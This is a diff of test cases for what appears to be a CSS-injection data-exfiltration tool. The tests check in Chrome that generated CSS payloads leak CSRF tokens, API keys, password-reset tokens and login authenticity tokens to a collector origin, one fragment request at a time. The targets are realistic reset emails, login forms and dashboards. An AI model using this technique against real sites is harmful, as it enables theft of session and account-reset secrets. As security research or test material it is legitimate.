@@ -123,6 +123,43 @@ blind('blind meta and data, alnum and base64url', [
 page([el('meta', { name: 'csrf-token', content: charsetSecrets.alnum }),
   el('div', { 'data-api-key': charsetSecrets.base64url })]));
 
+const oneShotConfig = { targets: B.TARGETS, urlKinds: ['a', 'form'],
+  dataNames: B.ONE_SHOT_DATA_NAMES, urlCharset: 'hex', urlWindow: 4 };
+const oneShotFields = B.oneShotFields(oneShotConfig);
+const oneShotFormValue = `fedcba9876543210abcdefff`;
+const oneShotForm = el('form', { action: `/login?state=${oneShotFormValue}` });
+const oneShotURL = `https://example.com/?code=${secret}&next=home`;
+const oneShotDoc = page([oneShotForm,
+  el('input', { type: 'hidden', name: 'csrf_token', value: charsetSecrets.alnum }, { form: oneShotForm }),
+  el('meta', { name: 'csrf-token', content: charsetSecrets.base64 }),
+  el('a', { href: oneShotURL }),
+  el('span', { 'data-api-key': charsetSecrets.base64url }),
+]);
+cases.push({ name: 'one-shot blind discovery and extraction',
+  html: `<form action="/login?state=${oneShotFormValue}"><input type="hidden" name="csrf_token" value="${charsetSecrets.alnum}">host</form>` +
+    `<meta name="csrf-token" content="${charsetSecrets.base64}">` +
+    `<a href="${escapeHTML(oneShotURL)}">host</a><span data-api-key="${charsetSecrets.base64url}">host</span>`,
+  build(origin) {
+    const payload = B.oneShotPayload(oneShotFields, oneShotConfig);
+    return { css: B.render(payload, origin), expected: requests(oneShotDoc, payload), probeCount: payload.rules.length };
+  },
+});
+
+const busyConfig = { targets: ['input'], dataNames: [], urlCharset: 'hex', urlWindow: 4 };
+const busyFields = B.oneShotFields(busyConfig);
+const busySecret = charsetSecrets.alnum;
+const busyInput = el('input', { type: 'hidden', name: 'csrf', value: busySecret });
+const busyRows = Array.from({ length: 600 }, (_, i) =>
+  `<div><span>row</span><a href="/item?id=${i}&ref=list">link</a><input name="q${i}"><p>text</p></div>`).join('');
+cases.push({ name: 'one-shot hidden input on a busy page',
+  html: `<input type="hidden" name="csrf" value="${busySecret}"><span>host</span>${busyRows}`,
+  build(origin) {
+    const payload = B.oneShotPayload(busyFields, busyConfig);
+    return { css: B.render(payload, origin), expected: requests(page([busyInput]), payload),
+      probeCount: payload.rules.length };
+  },
+});
+
 const quoted = '"\\' + secret + '\n&';
 targeted('escaped attribute context', { selector: 'a', attribute: 'href', tag: 'a', windowSize: 3,
   startContext: '"\\', endContext: '\n&' }, quoted, `<a href="${escapeHTML(quoted)}">target</a>`);
@@ -162,6 +199,67 @@ page(dataElements), true);
 targeted('localhost collector with same-origin CSP', { selector: 'a', attribute: 'href', tag: 'a', windowSize: 3,
   useStartsWith: true, useEndsWith: true }, secret, `<a href="${secret}">target</a>`);
 Object.assign(cases[cases.length - 1], { hostname: 'localhost', csp: "img-src 'self'" });
+
+// Realistic full pages rendered in Chrome: the token sits in among ordinary
+// page chrome (headings, copy, other links, buttons), and we check the browser
+// fires exactly the fragment requests that rebuild it. A clean 40-char hex
+// token with 4-char windows recovers as a single answer.
+const hexSecret = '3f8a1c9e0b2d4f6a8c1e3b5d7f9a0c2e4b6d8f0a';
+const resetCfg = buildConfig({
+  selector: 'a[href^="https://app.example.com/account/reset?"]', attribute: 'href',
+  tokenName: 'reset token', startSelector: 'token=', endSelector: '&uid=',
+  tokenLength: hexSecret.length, windowSize: 4, charset: 'hex',
+});
+const resetHref = `https://app.example.com/account/reset?token=${hexSecret}&uid=4821`;
+targeted('realistic password-reset email (anchor)', resetCfg.config, resetHref,
+  `<div class="email-body" style="font-family:sans-serif">` +
+  `<h1>Reset your password</h1><p>Hi Alex,</p>` +
+  `<p>We received a request to reset your password. Click the button below to continue.</p>` +
+  `<a class="btn btn-primary" href="${escapeHTML(resetHref)}">Reset password</a>` +
+  `<p>Didn't request this? <a href="https://app.example.com/security">Let us know</a>.</p>` +
+  `<footer><a href="https://app.example.com/unsubscribe?u=4821">Unsubscribe</a></footer></div>`,
+  recovers(resetCfg, hexSecret));
+
+const loginCfg = buildConfig({
+  selector: 'input[type="hidden"][name="authenticity_token"]', attribute: 'value',
+  tokenName: 'authenticity_token', startSelector: '', endSelector: '',
+  tokenLength: hexSecret.length, windowSize: 4, charset: 'hex', hostMode: 'has',
+});
+targeted('realistic login form (hidden input, html:has host)', loginCfg.config, hexSecret,
+  `<header><nav><a href="/">Home</a><a href="/pricing">Pricing</a></nav></header>` +
+  `<main><h1>Sign in</h1>` +
+  `<form action="/session" method="post" accept-charset="UTF-8">` +
+  `<input type="hidden" name="authenticity_token" value="${hexSecret}" autocomplete="off">` +
+  `<label>Email <input type="email" name="email"></label>` +
+  `<label>Password <input type="password" name="password"></label>` +
+  `<button type="submit">Log in</button></form>` +
+  `<p><a href="/password/new">Forgot your password?</a></p></main>`,
+  recovers(loginCfg, hexSecret));
+
+// The same login form buried in a large, busy dashboard (hundreds of rows of
+// ordinary page chrome). With the html:has host and 4-char windows the browser
+// must evaluate :has across the whole DOM for every rule, so this guards
+// against Chrome crashing or stalling on a big page: the harness fails the case
+// if Chrome does not return the exact expected request set within its timeout.
+// None of the chrome matches the selector, so the expected requests are still
+// just the token's fragments.
+const busyChrome = Array.from({ length: 400 }, (_, i) =>
+  `<li class="activity-row"><a href="/users/${i}/profile">User ${i}</a>` +
+  `<span class="meta">signed in from 10.0.0.${i % 256}</span>` +
+  `<input type="text" name="note_${i}" value="" placeholder="Add a note">` +
+  `<button type="button">Dismiss</button></li>`).join('');
+targeted('realistic login form buried in a busy dashboard (html:has host, 4-char)',
+  loginCfg.config, hexSecret,
+  `<aside><nav><a href="/dashboard">Dashboard</a><a href="/team">Team</a>` +
+  `<a href="/billing">Billing</a><a href="/settings">Settings</a></nav></aside>` +
+  `<main><h1>Sign in to continue</h1>` +
+  `<form action="/session" method="post" accept-charset="UTF-8">` +
+  `<input type="hidden" name="authenticity_token" value="${hexSecret}" autocomplete="off">` +
+  `<label>Email <input type="email" name="email"></label>` +
+  `<label>Password <input type="password" name="password"></label>` +
+  `<button type="submit">Log in</button></form>` +
+  `<section class="recent"><h2>Recent activity</h2><ul>${busyChrome}</ul></section></main>`,
+  recovers(loginCfg, hexSecret));
 
 const form = el('form');
 const both = `<form><input type="hidden" name="csrf" value="${secret}">` +
